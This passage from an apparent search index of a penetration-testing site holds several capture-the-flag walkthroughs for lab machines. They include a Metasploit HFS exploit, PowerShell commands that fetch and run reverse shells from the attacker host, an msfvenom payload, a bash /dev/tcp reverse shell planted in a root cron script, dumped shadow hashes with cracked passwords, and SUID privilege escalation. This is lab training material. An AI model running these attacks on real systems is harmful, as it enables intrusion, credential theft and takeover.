00 00 00 00 |_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | smb2-security-mode: | 3.0.2: |_ Message signing enabled but not required |_clock-skew: mean: 0s, deviation: 0s, median: 0s | smb2-time: | date: 2022-09-27T11:14:30 |_ start_date: 2022-09-27T10:48:34 | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 11598/tcp): CLEAN (Couldn't connect) | Check 2 (port 59624/tcp): CLEAN (Couldn't connect) | Check 3 (port 43955/udp): CLEAN (Failed to receive data) | Check 4 (port 23853/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked Nmap done: 1 IP address (1 host up) scanned in 348.88 seconds Raw packets sent: 66982 (2.947MB) | Rcvd: 66685 (2.667MB) A website running on port 80, RPC, SMB using port 139 and 445) and some HTTP related services on 5985, 8080 and 47001. There is also a SSL service running on port 3389, which encrypts RDP sessions. The http server on port 8080 is running HFS 2.3. Gaining a foothold  ─# searchsploit http file server -w ------------------------------------------------------------------------- -------------------------------------------- Exploit Title | URL ------------------------------------------------------------------------- -------------------------------------------- ... Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | https://www.exploit-db.com/exploits/34668 Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | https://www.exploit-db.com/exploits/39161 Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | https://www.exploit-db.com/exploits/34852 Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | https://www.exploit-db.com/exploits/49125 ... ------------------------------------------------------------------------- -------------------------------------------- Shellcodes: No Results Papers: No Results There are several exploits possible for version 2.3.x. Remote Command Execution (1) gives the CVE. # msfconsole [*] Starting persistent handler(s)... msf6 > search 2014-6287 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Yes Rejetto HttpFileServer Remote Command Execution Use the one given exploit and set its options: msf6 > use exploit/windows/http/rejetto_hfs_exec [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS <IP address target> msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080 msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST IP <IP address attack machine> msf6 exploit(windows/http/rejetto_hfs_exec) > run [*] Started reverse TCP handler on <IP address attack machine>:4444 ... [*] Meterpreter session 1 opened (<IP address attack machine>:4444 -> <IP address target machine>:49186) at 2022-09-28 00:57:13 +0100 [*] Server stopped. meterpreter > Okay, got meterpreter. Find the flag ( search -f *.txt ) and continue. Privilege escalation with metasploit  PowerUp is a script that can be used to enumerate a Windows machine. meterpreter > upload /home/<kaliuser>/Downloads/PowerUp.ps1 meterpreter > load powershell meterpreter > powershell_shell PS > . .\\PowerUp.ps1 PS > Invoke-AllChecks A looong list. ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory} StartName : LocalSystem...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9a84d1c4ad8751601ec0e9a10fd64b7e",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/overpass2",
    "t": "Overpass 2 hacked ",
    "c": "https://tryhackme.com/room/overpass2hacked Overpass 2 hacked  Overpass has been hacked. Analyse the attacker’s actions and hack back in. Forensics - Analyse the PCAP  Open the pcap file in Wireshark and analyze the HTTP traffic (enter http as filter). Right-click on the first HTTP frame and select “Follow > TCP Stream”: The URL of the page used to upload a reverse shell Payload used to gain access Password used to escalate privileges Backdoor for persistence Before downloading the SSH backdoor, the attacker has dumped the content of the /etc/shadow file: root:*:18295:0:99999:7::: daemon:*:18295:0:99999:7::: bin:*:18295:0:99999:7::: sys:*:18295:0:99999:7::: sync:*:18295:0:99999:7::: games:*:18295:0:99999:7::: man:*:18295:0:99999:7::: lp:*:18295:0:99999:7::: mail:*:18295:0:99999:7::: news:*:18295:0:99999:7::: uucp:*:18295:0:99999:7::: proxy:*:18295:0:99999:7::: www-data:*:18295:0:99999:7::: backup:*:18295:0:99999:7::: list:*:18295:0:99999:7::: irc:*:18295:0:99999:7::: gnats:*:18295:0:99999:7::: nobody:*:18295:0:99999:7::: systemd-network:*:18295:0:99999:7::: systemd-resolve:*:18295:0:99999:7::: syslog:*:18295:0:99999:7::: messagebus:*:18295:0:99999:7::: _apt:*:18295:0:99999:7::: lxd:*:18295:0:99999:7::: uuidd:*:18295:0:99999:7::: dnsmasq:*:18295:0:99999:7::: landscape:*:18295:0:99999:7::: pollinate:*:18295:0:99999:7::: sshd:*:18464:0:99999:7::: james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7::: paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7::: szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7::: bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7::: muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7::: Save in a file named shadow.txt and crack it with john against the fasttrack wordlist to find how many passwords were crackable: # john shadow.txt --wordlist=/usr/share/wordlists/fasttrack.txt Using default input encoding: UTF-8 Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status secret12 (bee) abcd123 (szymex) 1qaz2wsx (muirland) secuirty3 (paradox) 4g 0:00:00:00 DONE (2022-10-02 01:00) 22.22g/s 1233p/s 6166c/s 6166C/s Spring2017..starwars Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Research - Analyse the code  Download the backdoor to figure out the default hash for the backdoor: $ wget https://github.com/NinjaJc01/ssh-backdoor/raw/master/backdoor $ chmod +x backdoor $ ./backdoor --help backdoor Flags: --version Displays the program version string. -h --help Displays help with available flag, subcommand, and positional value parameters. -p --port Local port to listen for SSH on (default: 2222) -i --interface IP address for the interface to listen on (default: 0.0.0.0) -k --key Path to private key for SSH server (default: id_rsa) -f --fingerprint SSH Fingerprint, excluding the SSH-2.0- prefix (default: OpenSSH_8.2p1 Debian-4) -a --hash Hash for backdoor (default: bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3) The source code of the backdoor ( main.go ) shows the hardcoded SALT (bottom of file): func passwordHandler(_ ssh.Context, password string) bool { return verifyPass(hash, \"1c362db832f3f864c8c2fe05f2002a05\", password) } Hash used by the attacker func hashPassword(password string, salt string) string { hash := sha512.Sum512([]byte(password + salt)) return fmt.Sprintf(\"%x\", hash) } The hardcoded salt is appended to the password, and the SHA512 of the resulting string makes the hash. Save hash:salt to file overpasshash.txt : 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 Crack with hashcat using mode 1710 for sha512($pass.$salt) : # hashcat --force -m 1710 -a 0 overpasshash.txt /usr/share/wordlists/rockyou.tx Hack back in  Scan: # nmap -sC -sV 10.10.199.98 -vv ... PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCytc0lfgdX4r5ZxA8cr9Qi/66ppcB+fyEtT75IUtKC32Y/rpvBfFGRg9YxHVhKQKBDh1KlgXL3hJTJH1aqjEPtwXORQx+QmK5yFFQa524mKj3WzFZswUcDTk4s4F+m761x+QZMcb//UJhWuqiZ2QV+GW1UJsawrFhK3nogzIQ/eomxxR6TodNx2z2CzVahLULWcQjAMOKPAlqF5vsaoWk39Y4u9JDqA2JdEI2//kIb4RjuMbZDOtUDCgPypTCMgLKzIzAZQ54nWsHoUHoGUdPlon1mkVKgno/9cjZVwqveqQpQpO3DrQpjdB6xiCzBz34H9iUMvCEgJab64WkIGLGH | 256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGidEthZX/MDeUCmzLRQlezisPE1OceyHa6QBfwGnWirEYCdHM68kMGFlNJODkA7dunY+TUARD5WcjXMAN1iw7A= | 256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPQ1lZqbCdY81xFaGZ1fwaVxJExe5+meLXraNAjwWTAm 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) |_http-title: LOL Hacked | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.29 (Ubuntu) 2222/tcp open ssh syn-ack OpenSSH 8.2p1 Debian 4 (protocol 2.0) | ssh-hostkey: | 2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDlwW5RS5iWPR+x1AVz4TAWAr/fSvF3KC16voiHSUImF8fNiWT4Pcb5KADkmhssq4amO2uyN+gF9KpEbXrVj63hKdkJrF4lQnzlxX8mHeeg9CLWA1/zI1BZ8TDmC9h45K3DwJjcD8zb56JPDi20PoIjVe3zUe3lf2geBxsAyhR5Cs4vWWUBzyocdkFDu+QXirPJv5lxcuiPhUVyDQZtHOK9evrXOOpeZiYgpqxcYTqHk5JcZbrV1sTNU8mkQiJXuVDQO+hOoOO7yES3reMv0pDXtc/Cfz5ZHJuAaGhU/fawIjUBlIeXY3wjUJe3UYgm1qE/idyq+9rU5TVApjxo+mjR Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ... Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds Hack back in via the backdoor using name and password found. If you get: # ssh james@10.10.98.146 -p 2222 Unable to negotiate with 10.10.98.146 port 2222: no matching host key type found. Their offer: ssh-rsa Add the following two lines to /etc/ssh/ssh_config first: PubkeyAcceptedAlgorithms +ssh-rsa HostkeyAlgorithms +ssh-rsa Again: # ssh james@10.10.98.146 -p 2222 The authenticity of host '[10.10.98.146]:2222 ([10.10.98.146]:2222)' can't be established. ... james@10.10.98.146's password: To run a command as administrator (user \"root\"), use \"sudo <command>\". See \"man sudo_root\" for details. Get the flag from user.txt : $ cd .. james@overpass-production:/home/james$ ls -la total 1136 drwxr-xr-x 7 james james 4096 Jul 22 2020 . drwxr-xr-x 7 root root 4096 Jul 21 2020 .. lrwxrwxrwx 1 james james 9 Jul 21 2020 .bash_history -> /dev/null -rw-r--r-- 1 james james 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 james james 3771 Apr 4 2018 .bashrc drwx------ 2 james james 4096 Jul 21 2020 .cache drwx------ 3 james james 4096 Jul 21 2020 .gnupg drwxrwxr-x 3 james james 4096 Jul 22 2020 .local -rw------- 1 james james 51 Jul 21 2020 .overpass -rw-r--r-- 1 james james 807 Apr 4 2018 .profile -rw-r--r-- 1 james james 0 Jul 21 2020 .sudo_as_admin_successful -rwsr-sr-x 1 root root 1113504 Jul 22 2020 .suid_bash drwxrwxr-x 3 james james 4096 Jul 22 2020 ssh-backdoor -rw-rw-r-- 1 james james 38 Jul 22 2020 user.txt drwxrwxr-x 7 james james 4096 Jul 21 2020 www james@overpass-production:/home/james$ cat user.txt And use the conveniently left .suid_bash (see GTFObins bash ): james@overpass-production:/home/james$ ./.suid_bash -p .suid_bash-4.4# cat /root/root.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5cb09e565b6a7901cadccd71ea1d54a2",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/alfred",
    "t": "Alfred ",
    "c": "https://tryhackme.com/room/alfred Alfred  Gain an initial shell, escalate privileges by exploiting Windows authentication tokens. Scanning  First run a simple port scan (without Ping) nmap -Pn -p- <IP address target machine> -oN portscan portscan: # Nmap 7.92 scan initiated Thu Sep 29 17:51:07 2022 as: nmap -Pn -p- -oN portscan 10.10.184.145 Nmap scan report for 10.10.184.145 Host is up, received user-set (0.043s latency). Scanned at 2022-09-29 17:51:07 BST for 112s Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 8080/tcp open http-proxy syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap # Nmap done at Thu Sep 29 17:52:59 2022 -- 1 IP address (1 host up) scanned in 112.75 seconds Three open ports: Two http (websites?) on port 80 and 8080, and a Remote Desktop service on port 3389. Run an -A scan on the three open ports: nmap -Pn -T4 -A -p80,3389,8080 <IP address target machine> -oN servicescan servicescan: # Nmap 7.92 scan initiated Thu Sep 29 17:57:00 2022 as: nmap -Pn -T4 -A -p80,3389,8080 -oN servicescan 10.10.184.145 Nmap scan report for 10.10.184.145 Host is up (0.042s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn't have a title (text/html). |_http-server-header: Microsoft-IIS/7.5 3389/tcp open tcpwrapped | ssl-cert: Subject: commonName=alfred | Not valid before: 2022-09-28T16:47:01 |_Not valid after: 2023-03-30T16:47:01 8080/tcp open http Jetty 9.4.z-SNAPSHOT | http-robots.txt: 1 disallowed entry |_/ |_http-title: Site doesn't have a title (text/html;charset=utf-8). |_http-server-header: Jetty(9.4.z-SNAPSHOT) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 42.93 ms 10.9.0.1 2 43.62 ms 10.10.184.145 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Sep 29 17:57:34 2022 -- 1 IP address (1 host up) scanned in 35.11 seconds A version for Microsoft IIS, a possible robots.txt on port 8080 and something called Jetty. Exploring  Browse to the IP address target machine>:80 and IP address target machine:8080 website. The first, on port 80, shows a silly image and message with nothing else to click or navigate to. The second shows a Jenkins login page. Maybe default credentials are used for Jenkin and then were not changed? Researching that, the default username is admin but the password gets automatically filled, dependent on system. And then maybe changed to something more easily memorised? Doing some password guessing manually, I found admin:admin . If that had not worked I could have tried intercepting a login request with Burpsuite and using Intruder to use a password list against the password field. But, as it is, I’m already in. Gaining a foothold  The Jenkins documentation gives me two possible ways of Remote Code Execution: Click “Project” to get into the prebuilt project, then click “Configure” on the left. Scrolling down, there is a window that allows for executing Windows batch commands. Windows batch commands window in project configuration Test with: whoami . Jenkins also comes with a “Script Console” administrative tool, which allows authenticated users to run scripts using Apache Groovy , a Java-syntax-compatible object-oriented programming language for the Java platform. On the mainpage on the left, click on “Manage Jenkins”, scroll down below the warnings, and click script console from the list. https://www.jenkins.io/doc/book/managing/script-console/ Test using print to display the output of the command: print \"whoami\".execute().text . A PowerShell command to execute a reverse shell might work in both. Nishang contains a lot of reverse shell payloads and more. If on Kali, copy Invoke-PowershellTcp.ps1 from /usr/share/nishang/Shells . If not on Kali, download Invoke-PowershellTcp.ps1 from Gihub . I decided not to copy and just host the entire Nishang Shells directory, by starting a server in the /usr/share/nishang/Shells directory: # python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Start a listener: # nc -lvnp 4443 Ncat: Version 7.92 ( https://nmap.org/ncat ) Option 1: Execute in windows batch command window: powershell iex (New-Object Net.WebClient).DownloadString(‘http://<IP address attack machine>:80/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port 443 Option 2: Script console: print \"powershell IEX(New-Object Net.WebClient).downloadString('http://<IP address attack machine>:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port 443\".execute().text In the terminal with the listener: # nc -lvnp 4443 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4443 Ncat: Listening on 0.0.0.0:4443 Ncat: Connection from 10.10.184.145. Ncat: Connection from 10.10.184.145:49217. Windows PowerShell running as user bruce on ALFRED Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Program Files (x86)\\Jenkins> Get the flag: PS C:\\Program Files (x86)\\Jenkins> cd ..\\..\\Users\\bruce\\Desktop PS C:\\Users\\bruce\\Desktop> cat users.txt Switching shells  Generate payload: # msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP address attack machine> LPORT=8080 -f exe -o shell.exe Set up a Python web server to host the reverse shell: # python3 -m http.server 8080 Download the shell.exe to the target machine: PS C:\\Users\\bruce\\Desktop> powershell \"(New-Object System.Net.WebClient).Downloadfile('http://[ATTACKER IP]:8080/shell.exe','shell.exe')\" In a new terminal, start Metasploit, select the multi handler module, set the payload type, LHOST and LPORT options to match the payload shell, and run the listener: # msfconsole -q msf6 > use exploit/multi/handler msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set LHOST <IP address attack machine> msf6 exploit(multi/handler) > set LPORT <Listen port on attack machine> msf6 exploit(multi/handler) > run In the powershell terminal, execute the reverse shell using the Powershell Start-Process cmdlet: PS C:\\Users\\bruce\\Desktop> Start-Process \"shell.exe\" Back in the metasploit terminal: [*] Started reverse TCP handler on 10.9.1.53:4443 [*] Sending stage (175686 bytes) to 10.10.184.145 [*] Meterpreter session 1 opened (10.9.1.53:4443 -> 10.10.184.145:49352) at 2022-09-29 20:13:30 +0100 meterpreter > Privilege escalation  Check privileges. Left out all disabled services for readability: PS C:\\Users\\bruce\\Desktop> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State =============================== ========================================= ======== ... SeDebugPrivilege Debug programs Enabled ... SeChangeNotifyPrivilege Bypass traverse checking Enabled ... SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled ... It appears the current user has the SeImpersonate privilege. Impersonation  Load incognito , which allows for impersonating tokens: meterpreter > load...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bcd38c7344d1609326d5ba8158ee0465",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/cron",
    "t": "Cron jobs exploits ",
    "c": "Cron jobs exploits  Become root on Linux using cron jobs: Find cron jobs from current user that run as root and may be exploited Change the script or program to start a reverse shell as root Listen and wait for it Example: Backup script  ssh into the target machine and look at /etc/crontab : Last login: Sun Jun 20 10:17:43 2021 from 10.9.2.27 $ cat /etc/crontab ... # * * * * * root /antivirus.sh * * * * * root antivirus.sh * * * * * root /home/karen/backup.sh * * * * * root /tmp/test.py Karen’s backup script and test.py both run as root. Use either. On the attack machine start a listener: └─$ nc -lnvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Change the backup script: $ ls backup.sh $ mv backup.sh backup.sh.old $ touch backup.sh $ nano backup.sh Put this code in: #!/bin/bash bash -i >& /dev/tcp/<IP address attack machine>/4444 0>&1 And make the script executable: $ chmod +x backup.sh On the attack machine: └─# nc -lnvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from <target IP address>. Ncat: Connection from <target IP address>:55932. bash: cannot set terminal process group (12785): Inappropriate ioctl for device bash: no job control in this shell root@target:~# python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' root@target:~# cat /etc/shadow | grep matt cat /etc/shadow | grep matt matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7::: root@target:~# cat /etc/passwd | grep matt cat /etc/passwd | grep matt matt:x:1002:1002::/home/matt:/bin/sh On the attack machine, copy matt’s shadow in shadow.txt and matt’s password in password.txt . $ unshadow passwd.txt shadow.txt > crackmatt.txt $ john --wordlist=/usr/share/wordlists/rockyou.txt crackmatt.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 123456 (matt) 1g 0:00:00:00 DONE (2022-09-25 23:30) 3.225g/s 3303p/s 3303c/s 3303C/s 123456..bethany Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Notes  Not really exploit usage, but based on files with incorrectly installed authorities.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "7fb9b508c9afc420ce4228a0917e20dc",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/relevant",
    "t": "Relevant ",
    "c": "https://tryhackme.com/room/relevant Relevant  A test of the ability to enumerate fully before exploiting. It teaches that the most seemingly obvious finding we see cannot always be exploited, and that we have to know when to quit and try something else. Scanning  Run a simple port scan (without Ping) nmap -Pn -p- <IP target> -oN portscan portscan: # Nmap 7.92 scan initiated Sun Oct 2 19:30:43 2022 as: nmap -Pn -p- -oN portscan <IP target> Nmap scan report for <IP target> Host is up (0.047s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49663/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown # Nmap done at Sun Oct 2 19:32:29 2022 -- 1 IP address (1 host up) scanned in 105.29 seconds Run an -A scan on the open ports: nmap -Pn -T4 -A -p80,135,139,445,3389,49663,49667,49669 <IP target> -oN servicescan servicescan: # Nmap 7.92 scan initiated Sun Oct 2 19:35:11 2022 as: nmap -Pn -T4 -A -p80,135,139,445,3389,49663,49667,49669 -oN servicescan <IP target> Nmap scan report for <IP target> Host is up (0.046s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=Relevant | Not valid before: 2022-10-01T18:23:23 |_Not valid after: 2023-04-02T18:23:23 |_ssl-date: 2022-10-02T18:36:56+00:00; 0s from scanner time. | rdp-ntlm-info: | Target_Name: RELEVANT | NetBIOS_Domain_Name: RELEVANT | NetBIOS_Computer_Name: RELEVANT | DNS_Domain_Name: Relevant | DNS_Computer_Name: Relevant | Product_Version: 10.0.14393 |_ System_Time: 2022-10-02T18:36:17+00:00 49663/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%) OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607 Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s | smb2-time: | date: 2022-10-02T18:36:17 |_ start_date: 2022-10-02T18:23:43 | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) | Computer name: Relevant | NetBIOS computer name: RELEVANT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-10-02T11:36:20-07:00 TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 43.72 ms 10.9.0.1 2 44.07 ms <IP target> OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Oct 2 19:36:56 2022 -- 1 IP address (1 host up) scanned in 105.97 seconds HTTP enumeration  nikto -h http://<IP target> Results: - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: <IP target> + Target Hostname: <IP target> + Target Port: 80 + Start Time: 2022-10-02 19:39:32 (GMT1) --------------------------------------------------------------------------- + Server: Microsoft-IIS/10.0 + Retrieved x-powered-by header: ASP.NET + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Retrieved x-aspnet-version header: 4.0.30319 + No CGI Directories found (use '-C all' to force check all possible dirs) + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST + Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST + 7889 requests: 0 error(s) and 7 item(s) reported on remote host + End Time: 2022-10-02 19:48:51 (GMT1) (559 seconds) --------------------------------------------------------------------------- + 1 host(s) tested Hidden files and directories  gobuster dir -u http://<IP target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50 Results: =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://<IP target> [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== 2022/10/02 19:59:33 Starting gobuster in directory enumeration mode =============================================================== /*checkout* (Status: 400) [Size: 3420] /*docroot* (Status: 400) [Size: 3420] /* (Status: 400) [Size: 3420] ... /http%3A%2F%2Fweblog (Status: 400) [Size: 3420] /http%3A%2F%2Fswik (Status: 400) [Size: 3420] =============================================================== 2022/10/02 20:20:21 Finished =============================================================== SMB enumeration  # smbclient -L //<IP target> do_connect: Connection to <IP target> failed (Error NT_STATUS_IO_TIMEOUT) Nmap scan on ports 139 and 445 with all SMB enumeration scripts: # nmap -p 139,445 -Pn --script smb-enum* <IP target> Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-02 20:38 BST Nmap scan report for <IP target> Host is up (0.075s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: guest | \\\\<IP target>\\ADMIN$: | Type: STYPE_DISKTREE_HIDDEN | Comment: Remote Admin | Anonymous access: <none> | Current user access: <none> | \\\\<IP target>\\C$: | Type: STYPE_DISKTREE_HIDDEN | Comment: Default share | Anonymous access: <none> | Current user access: <none> | \\\\<IP target>\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: Remote IPC | Anonymous access: <none> | Current user access: READ/WRITE | \\\\<IP target>\\nt4wrksv: | Type: STYPE_DISKTREE | Comment: | Anonymous access: <none> |_ Current user access: READ/WRITE | smb-enum-sessions: |_ <nobody> Nmap done: 1 IP address (1 host up) scanned in 44.41 seconds Check for any known vulnerabilities within the SMB service: # nmap -p 139,445 -Pn --script smb-vuln* <IP target> Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-02 20:40 BST Nmap scan report for <IP target> 